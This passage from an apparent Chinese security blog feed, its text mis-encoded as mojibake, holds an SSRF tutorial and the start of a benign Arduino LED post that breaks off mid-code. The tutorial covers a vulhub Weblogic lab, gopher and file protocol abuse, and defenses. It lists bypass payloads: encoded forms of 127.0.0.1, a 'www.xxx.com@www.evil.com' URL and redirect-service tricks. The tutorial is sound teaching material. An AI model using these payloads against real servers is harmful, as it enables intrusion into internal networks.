src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331220047359.png" alt="image-20210331220047359"></p><h1 id="SSRFæ¼æ´æµ‹è¯•"><a href="#SSRFæ¼æ´æµ‹è¯•" class="headerlink" title="SSRFæ¼æ´æµ‹è¯•"></a>SSRFæ¼æ´æµ‹è¯•</h1><p>æ¼æ´æµ‹è¯•é¶åœºï¼š<strong>vulhubä¹‹Weblogic SSRFæ¼æ´</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220238584.png" alt="image-20210401220238584"></p><p>SSRFæ¼æ´å­˜åœ¨äº<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8brupsuite%E4%B8%8B%E6%B5%8B%E8%AF%95%E8%AF%A5%E6%BC%8F%E6%B4%9E%E3%80%82%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E7%9A%84IP:PORT%EF%BC%8C%E5%A6%82http://127.0.0.1:7001%EF%BC%9A">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jspï¼Œæˆ‘ä»¬åœ¨brupsuiteä¸‹æµ‹è¯•è¯¥æ¼æ´ã€‚è®¿é—®ä¸€ä¸ªå¯ä»¥è®¿é—®çš„IP:PORTï¼Œå¦‚http://127.0.0.1:7001ï¼š</a></p><p>å¯è®¿é—®çš„ç«¯å£å°†ä¼šå¾—åˆ°é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯è¿”å›status codeï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå¦‚æœè®¿é—®çš„éhttpåè®®ï¼Œåˆ™ä¼šè¿”å›did not have a valid SOAP content-typeã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220537141.png" alt="image-20210401220537141"></p><p>ä¿®æ”¹ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç«¯å£ï¼Œå°†ä¼šè¿”å›could not connect over HTTP to serverã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220649022.png" alt="image-20210401220649022"></p><p>é€šè¿‡é”™è¯¯çš„ä¸åŒï¼Œå³å¯æ¢æµ‹å†…ç½‘çŠ¶æ€ã€‚</p><h1 id="SSRFæ¼æ´å¸¸è§æŒ–æ˜æ–¹æ³•"><a href="#SSRFæ¼æ´å¸¸è§æŒ–æ˜æ–¹æ³•" class="headerlink" title="SSRFæ¼æ´å¸¸è§æŒ–æ˜æ–¹æ³•"></a>SSRFæ¼æ´å¸¸è§æŒ–æ˜æ–¹æ³•</h1><h2 id="SSRFæ¶‰åŠçš„åè®®"><a href="#SSRFæ¶‰åŠçš„åè®®" class="headerlink" title="SSRFæ¶‰åŠçš„åè®®"></a>SSRFæ¶‰åŠçš„åè®®</h2><ul><li>fileåè®®ï¼šåœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶çš„å†…å®¹</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401224611290.png" alt="image-20210401224611290"></p><ul><li>dictåè®®ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401224503411.png" alt="image-20210401224503411"></p><ul><li>gopheråè®®ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ï¼Œå¯ç”¨äºåå¼¹shell</li><li>http/såè®®ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</li></ul><h2 id="SSRFå¸¸è§çš„ç§ç±»"><a href="#SSRFå¸¸è§çš„ç§ç±»" class="headerlink" title="SSRFå¸¸è§çš„ç§ç±»"></a>SSRFå¸¸è§çš„ç§ç±»</h2><ol><li>è¿œç¨‹ä¸‹è½½SSRFï¼šå¯ä»¥ç›´æ¥æ“çºµæœåŠ¡å™¨è¿œç¨‹ä¸‹è½½å…¶ä»–æœåŠ¡å™¨çš„èµ„æºï¼Œè¿™ç§å¯ä»¥å®Œå…¨å›æ˜¾æ‰€æœ‰ä¿¡æ¯ï¼Œå±å®³æœ€å¤§ã€‚</li><li>å¸ƒå°”å‹SSRFï¼šä¸ä¼šå›æ˜¾è¢«æ”»å‡»çš„å†…ç½‘ä¿¡æ¯ï¼Œæ˜¯æç¤ºtrueå’Œfalseï¼Œè¿™ç§å¯¹æ”»å‡»è€…æä¾›çš„ä¿¡æ¯è¾ƒå°‘ï¼Œä¸€èˆ¬åªèƒ½æ¢æµ‹å’Œç›²æ‰“ï¼Œåˆ©ç”¨ç‡ä¸é«˜ã€‚</li><li>æ— å›æ˜¾SSRFï¼šä¸å›æ˜¾ä»»ä½•ä¿¡æ¯çš„SSRFã€‚åªèƒ½é€šè¿‡dnslogåˆ¤æ–­ssrfæ˜¯å¦å­˜åœ¨ï¼Œæ— æ³•ç”¨æ¥æ¢æµ‹å†…ç½‘ï¼Œåªèƒ½é…åˆå…¶ä»–ä¿¡æ¯æ³„éœ²æ¥ç›²æ‰“å†…ç½‘ã€‚å•ç‹¬å­˜åœ¨æ²¡æœ‰å±å®³ã€‚</li></ol><h2 id="SSRFé€šå¸¸å¯èƒ½å­˜åœ¨çš„åœ°æ–¹"><a href="#SSRFé€šå¸¸å¯èƒ½å­˜åœ¨çš„åœ°æ–¹" class="headerlink" title="SSRFé€šå¸¸å¯èƒ½å­˜åœ¨çš„åœ°æ–¹"></a>SSRFé€šå¸¸å¯èƒ½å­˜åœ¨çš„åœ°æ–¹</h2><ol><li><p>ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º</p></li><li><p>è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</p></li><li><p>åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹</p></li><li><p>å›¾ç‰‡åŠ è½½/ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p></li><li><p>å›¾ç‰‡/æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦å…¶ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨å…·ä½“éªŒ</p></li><li><p>äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œssrfæµ‹è¯•</p></li><li><p>ç½‘ç«™é‡‡é›†ã€ç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ</p></li><li><p>æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°</p></li><li><p>é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€</p></li><li><p>ç¼–ç å¤„ç†ã€å±æ€§ä¿¡æ¯å¤„ç†ã€æ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰</p></li><li><p>æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´</p><p>ä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦</p></li><li><p>ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.phpï¼‰</p></li></ol><h2 id="SSRFæ¼æ´éªŒè¯æ–¹æ³•"><a href="#SSRFæ¼æ´éªŒè¯æ–¹æ³•" class="headerlink" title="SSRFæ¼æ´éªŒè¯æ–¹æ³•"></a>SSRFæ¼æ´éªŒè¯æ–¹æ³•</h2><ol><li>æ’é™¤æ³•ï¼šæµè§ˆå™¨f12æŸ¥çœ‹æºä»£ç çœ‹æ˜¯å¦æ˜¯åœ¨æœ¬åœ°è¿›è¡Œäº†è¯·æ±‚</li></ol><p>æ¯”å¦‚ï¼šè¯¥èµ„æºåœ°å€ç±»å‹ä¸º <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´</a></p><ol start="2"><li>dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è¢«è®¿é—®</li></ol><p>â€“å¯ä»¥åœ¨ç›²æ‰“åå°ç”¨ä¾‹ä¸­å°†å½“å‰å‡†å¤‡è¯·æ±‚çš„uri å’Œå‚æ•°ç¼–ç æˆbase64ï¼Œè¿™æ ·ç›²æ‰“åå°è§£ç åå°±çŸ¥é“æ˜¯å“ªå°æœºå™¨å“ªä¸ªcgiè§¦å‘çš„è¯·æ±‚ã€‚</p><ol start="3"><li>æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯ä¸æ˜¯ç”±æœåŠ¡å™¨çš„å‘é€çš„ï¼Œå¦‚æœä¸æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯ï¼Œæ¥ç€æ‰¾å­˜åœ¨HTTPæœåŠ¡çš„å†…ç½‘åœ°å€</li></ol><p>â€“ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„æ¼çš„å­˜åœ¨webåº”ç”¨å†…ç½‘åœ°å€</p><p>â€“é€šè¿‡äºŒçº§åŸŸåæš´åŠ›çŒœè§£å·¥å…·æ¨¡ç³ŠçŒœæµ‹å†…ç½‘åœ°å€</p><ol start="4"><li>ç›´æ¥è¿”å›çš„Bannerã€titleã€contentç­‰ä¿¡æ¯</li><li>ç•™æ„boolå‹SSRF</li></ol><h2 id="SSRFç»•è¿‡å§¿åŠ¿"><a href="#SSRFç»•è¿‡å§¿åŠ¿" class="headerlink" title="SSRFç»•è¿‡å§¿åŠ¿"></a>SSRFç»•è¿‡å§¿åŠ¿</h2><blockquote><p>æ›´å¤šè§ <a href="https://www.secpulse.com/archives/65832.html">SSRFç»•è¿‡æ–¹æ³•æ€»ç»“</a> ã€å‚è€ƒèµ„æ–™[3]</p></blockquote><ol><li><p>è¿›åˆ¶çš„è½¬æ¢ç»•è¿‡å†…ç½‘IP</p><p>å¯ä»¥ä½¿ç”¨ä¸€äº›ä¸åŒçš„è¿›åˆ¶æ›¿ä»£ipåœ°å€ï¼Œä»è€Œç»•è¿‡WAFã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å¦‚ 127.0.0.1</span><br><span class="line">8è¿›åˆ¶ï¼š0177.0.0.1</span><br><span class="line">16è¿›åˆ¶ï¼š0x7f.0.0.1</span><br><span class="line">10è¿›åˆ¶ï¼š2130706433</span><br></pre></td></tr></table></figure><p>å…¶ä»–å„ç§æŒ‡å‘127.0.0.1çš„åœ°å€</p><blockquote><p><a href="http://localhost/">http://localhost/</a>         # localhostå°±æ˜¯ä»£æŒ‡127.0.0.1</p><p><a href="http://0.0.0.0/">http://0/</a>                 # 0åœ¨windowä¸‹ä»£è¡¨0.0.0.0ï¼Œè€Œåœ¨liunxä¸‹ä»£è¡¨127.0.0.1</p><p><a href="http://0.0.0.0/">http://0.0.0.0/</a>       # 0.0.0.0è¿™ä¸ªIPåœ°å€è¡¨ç¤ºæ•´ä¸ªç½‘ç»œï¼Œå¯ä»¥ä»£è¡¨æœ¬æœº ipv4 çš„æ‰€æœ‰åœ°å€http://[0:0:0:0:0:ffff:127.0.0.1]/    # åœ¨liunxä¸‹å¯ç”¨ï¼Œwindowæµ‹è¯•äº†ä¸‹ä¸è¡Œ</p><p>http://[::]:80/           # åœ¨liunxä¸‹å¯ç”¨ï¼Œwindowæµ‹è¯•äº†ä¸‹ä¸è¡Œ</p><p><a href="http://127.0.0.1/">http://127ã€‚0ã€‚0ã€‚1/</a>       # ç”¨ä¸­æ–‡å¥å·ç»•è¿‡</p><p>http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ </p><p><a href="http://127.0.0.1/">http://127.00000.00000.001/</a> # 0çš„æ•°é‡å¤šä¸€ç‚¹å°‘ä¸€ç‚¹éƒ½æ²¡å½±å“ï¼Œæœ€åè¿˜æ˜¯ä¼šæŒ‡å‘127.0.0.1</p></blockquote></li><li><p>åˆ©ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡</p><p>å¦‚æœç›®æ ‡ä»£ç é™åˆ¶è®¿é—®çš„åŸŸååªèƒ½ä¸º <a href="http://www.xxx.com/">http://www.xxx.com</a> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@ï¼š<a href="http://www.xxx.com@www.evil.com/">http://www.xxx.com@www.evil.com</a></p></li><li><p>åˆ©ç”¨302è·³è½¬ç»•è¿‡å†…ç½‘IP</p></li></ol><p>ï¼ˆ1ï¼‰ç½‘ç»œä¸Šå­˜åœ¨ä¸€ä¸ªå¾ˆç¥å¥‡çš„æœåŠ¡ï¼Œç½‘å€ä¸º <a href="http://xip.ioï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåï¼Œä¸¾ä¸ªä¾‹å­ï¼š">http://xip.ioï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåï¼Œä¸¾ä¸ªä¾‹å­ï¼š</a></p><p>å½“æˆ‘ä»¬è®¿é—®ï¼š<a href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a> æ—¶ï¼Œå®é™…ä¸Šè®¿é—®çš„æ˜¯<a href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a> ã€‚åƒè¿™ç§ç½‘å€è¿˜æœ‰<a href="http://nip.io,http//sslip.io">http://nip.ioï¼Œhttp://sslip.io</a> ã€‚</p><p>å¦‚ä¸‹ç¤ºä¾‹ï¼ˆflag.phpä»…èƒ½ä»æœ¬åœ°è®¿é—®ï¼‰ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401203614705.png" alt="image-20210401203614705"></p><p>ï¼ˆ2ï¼‰çŸ­åœ°å€è·³è½¬ç»•è¿‡ï¼Œè¿™é‡Œä¹Ÿç»™å‡ºä¸€ä¸ªç½‘å€ <a href="https://4m.cn/%EF%BC%9A">https://4m.cn/ï¼š</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401203936903.png" alt="image-20210401203936903"></p><p>ç›´æ¥ä½¿ç”¨ç”Ÿæˆçš„çŸ­è¿æ¥ <a href="https://4m.cn/FjOdQ%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8302%E8%B7%B3%E8%BD%AC%E5%88%B0">https://4m.cn/FjOdQå°±ä¼šè‡ªåŠ¨302è·³è½¬åˆ°</a> <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡WAFäº†ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401204144651.png" alt="image-20210401204144651"></p><h1 id="SSRFæ¼æ´å¸¸ç”¨é˜²å¾¡æ–¹æ³•"><a href="#SSRFæ¼æ´å¸¸ç”¨é˜²å¾¡æ–¹æ³•" class="headerlink" title="SSRFæ¼æ´å¸¸ç”¨é˜²å¾¡æ–¹æ³•"></a>SSRFæ¼æ´å¸¸ç”¨é˜²å¾¡æ–¹æ³•</h1><p>é€šè¿‡ä¸Šé¢çš„çŸ¥é“äº†SSRFæ¼æ´æœ€å¤§çš„æˆå› æ˜¯URLå®Œå…¨å¯æ§ï¼ŒæœåŠ¡å™¨ä¼šå¯¹ç”¨æˆ·æ„é€ çš„URLè¿›è¡Œå“åº”ï¼Œæ‰€ä»¥ä»é˜²å¾¡æ–¹é¢æ¥çœ‹æˆ‘ä»¬è¦ç¦æ­¢æœåŠ¡å™¨éšæ„å“åº”ç”¨æˆ·æ„é€ çš„URLã€‚</p><ol><li>è¿‡æ»¤ã€‚è¿‡æ»¤è¿”å›çš„ä¿¡æ¯ï¼Œå¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚</li><li>ç¦æ­¢è·³è½¬ã€‚é˜²æ­¢ç”¨æˆ·åˆ©ç”¨æœåŠ¡å™¨åšè·³æ¿æœº</li><li>ç¦æ­¢ä¸å¸¸ç”¨çš„åè®®ï¼Œä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile:///,gopher://,ftp://ç­‰å¼•èµ·çš„é—®é¢˜ã€‚</li><li>é™åˆ¶ç«¯å£ã€‚åªå¼€æ”¾å¸¸ç”¨ç«¯å£</li><li>ç»Ÿä¸€è¿”å›çš„é”™è¯¯ä¿¡æ¯ã€‚è¿™æ ·ç”¨æˆ·å°±ä¸å¯ä»¥æ ¹æ®è¿”å›ä¿¡æ¯åˆ¤æ–­ç«¯å£æƒ…å†µã€‚</li><li>ä½¿ç”¨DNSç¼“å­˜æŠ€æœ¯é˜²æ­¢DNSè§£ææ”»å‡»</li><li>ä½¿ç”¨æ­£åˆ™é˜²æ­¢ç•¸å½¢ç»•è¿‡</li></ol><h1 id="XSS-CSRF-SSRFå¼‚åŒ"><a href="#XSS-CSRF-SSRFå¼‚åŒ" class="headerlink" title="XSS,CSRF,SSRFå¼‚åŒ"></a>XSS,CSRF,SSRFå¼‚åŒ</h1><p>XSSï¼ŒCSRF,SSRFä¸‰ç§å¸¸è§çš„WebæœåŠ¡ç«¯æ¼æ´å‡æ˜¯ç”±äºï¼ŒæœåŠ¡å™¨ç«¯å¯¹ç”¨æˆ·æä¾›çš„å¯æ§æ•°æ®è¿‡äºä¿¡ä»»æˆ–è€…è¿‡æ»¤ä¸ä¸¥å¯¼è‡´çš„ã€‚</p><p>ä¸åŒç‚¹ï¼š</p><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>XSSæ˜¯æœåŠ¡å™¨å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„è¿‡æ»¤ï¼Œå¯¼è‡´å®¢æˆ·ç«¯æµè§ˆå™¨åœ¨æ¸²æŸ“æœåŠ¡å™¨è¿”å›çš„htmlé¡µé¢æ—¶ï¼Œå‡ºç°äº†é¢„æœŸå€¼ä¹‹å¤–çš„ è„šæœ¬è¯­å¥è¢«æ‰§è¡Œã€‚</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>CSRFæ˜¯æœåŠ¡å™¨ç«¯æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œéšæœºå€¼æ ¡éªŒï¼Œä¸”å¯¹httpè¯·æ±‚åŒ…å†…çš„referå­—æ®µæ ¡éªŒä¸ä¸¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ åˆ©ç”¨ç”¨æˆ·çš„Cookieä¿¡æ¯ä¼ªé€ ç”¨æˆ·è¯·æ±‚å‘é€è‡³æœåŠ¡å™¨ã€‚</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>SSRFæ˜¯æœåŠ¡å™¨å¯¹ ç”¨æˆ·æä¾›çš„å¯æ§URLè¿‡äºä¿¡ä»»ï¼Œæ²¡æœ‰å¯¹æ”»å‡»è€…æä¾›çš„RULè¿›è¡Œåœ°å€é™åˆ¶å’Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä»¥æ­¤ä¸ºè·³æ¿æ”»å‡»å†…ç½‘æˆ–å…¶ä»–æœåŠ¡å™¨ã€‚</p></div><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://zhuanlan.zhihu.com/p/91819069">SSRFæ¼æ´æ”»å‡»åŸç†åŠé˜²å¾¡æ–¹æ¡ˆ</a></p><p>[2] <a href="https://xz.aliyun.com/t/2115?accounttraceid=941294f62118431d9627281481dc0f3bngye#toc-5">äº†è§£SSRF,è¿™ä¸€ç¯‡å°±è¶³å¤Ÿäº†</a></p><p>[3] <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247495875&idx=1&sn=5c25babaff728cc8498dced8f56a5bf1&chksm=ec1ca5fcdb6b2cea98cc125cee654d9d6426dabcc1ab8a6d466b7fc140ae8bfb59d63f473b9b&mpshare=1&scene=23&srcid=0401sfQC8XjENqPmXz5WNZZ8&sharer_sharetime=1617266425319&sharer_shareid=0682904b850da48c54cd507e190afd60#rd">å¹²è´§ | SSRFæ¼æ´åˆ©ç”¨æ€»ç»“</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduinoè¯•ç©ä½“éªŒ</title>
      <link href="posts/5548.html"/>
      <url>posts/5548.html</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>å‰å‡ å¤©ï¼Œå¹¸è¿åœ°å¾—åˆ°äº†å­¦é•¿èµ é€çš„ä¸€ç»„ Arduino å¥—ä»¶ï¼Œå¥½å­¦ï¼ˆç©ï¼‰çš„æˆ‘è‡ªç„¶æ˜¯æ¿€åŠ¨ä¸‡åˆ†ã€‚äºæ˜¯å¼€å§‹äº† Arduinoå…¥å‘ä¹‹æ—…ã€‚ç°å°±åˆæ¬¡å­¦ä¹ ï¼ˆè¯•ç©ï¼‰å¤§ä½“æƒ…å†µä½œå¦‚ä¸‹è®°å½•ã€‚</p></div><h1 id="Ariuino-å¥—ä»¶"><a href="#Ariuino-å¥—ä»¶" class="headerlink" title="Ariuino å¥—ä»¶"></a>Ariuino å¥—ä»¶</h1><p>æ­¤å¥—ä»¶ä¸»è¦åŒ…å«æœ‰ Arduino UNOæ¿å­ã€é©±åŠ¨æ¨¡å—ï¼ˆL298Nï¼‰ã€å°è½¦å¥—ä»¶ã€æœé‚¦çº¿ã€é¢åŒ…æ¿ã€å„ç§ä¼ æ„Ÿå™¨ç­‰ç­‰ã€‚ï¼ˆç¬¬ä¸€æ¬¡æ¥è§¦è¿™äº›ï¼Œå·²ç»è¢«æˆ‘ç¿»å¾—æ··ä¹±ä¸å ªï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328162824003.png" alt="image-20210328162824003"></p><h1 id="ç‚¹ç¯ğŸ’¡"><a href="#ç‚¹ç¯ğŸ’¡" class="headerlink" title="ç‚¹ç¯ğŸ’¡"></a>ç‚¹ç¯ğŸ’¡</h1><p>ç»è¿‡ä¸€ç•ªå­¦ä¹ åï¼Œå¤§æ¦‚äº†è§£äº†è¿™äº›ä¸œè¥¿å„è‡ªçš„ä½œç”¨ã€‚é©¬ä¸Šå¼€å§‹äº†ç¬¬ä¸€ä¸ªï¼ˆæœ€ç®€å•çš„ï¼‰å°è¯•ï¼Œç‚¹äº® LED ç¯ï¼Œæ•ˆæœè¿˜å¯ä»¥ï¼Œç¯äº®äº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328163509247.png" alt="image-20210328163509247"></p><p>å®ç°ä»£ç ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line">  <span class="built_in">pinMode</span>(<span class="number">13</span>, <span class="literal">OUTPUT</span>); <span class="comment">//å°†13å·å¼•è„šè®¾ç½®ä¸ºè¾“å‡ºçŠ¶æ€</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">HIGH</span>); <span class="comment">//é«˜ç”µå¹³</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">LOW</span>); <span class="comment">//ä½ç”µå¹³</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æµæ°´ç¯âœ¨"><a href="#æµæ°´ç¯âœ¨" class="headerlink" title="æµæ°´ç¯âœ¨"></a>æµæ°´ç¯âœ¨</h1><p>ç¬¬äºŒä¸ªåšçš„æ˜¯æµæ°´ç¯ï¼Œå› ä¸ºåªæœ‰6ä¸ªLEDå°ç¯ï¼Œåšå¾—æ¯”è¾ƒç®€å•ï¼Œ6ä¸ªç¯åœ¨é¢åŒ…æ¿ä¸Šä¾æ¬¡äº®ç­ï¼Œä¹Ÿè¿˜å¯ä»¥ã€‚è¿˜å­¦ä¹ åˆ°äº†é¢åŒ…æ¿çš„ä½¿ç”¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/d_lamp.gif"></p><p>å®ç°ä»£ç ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 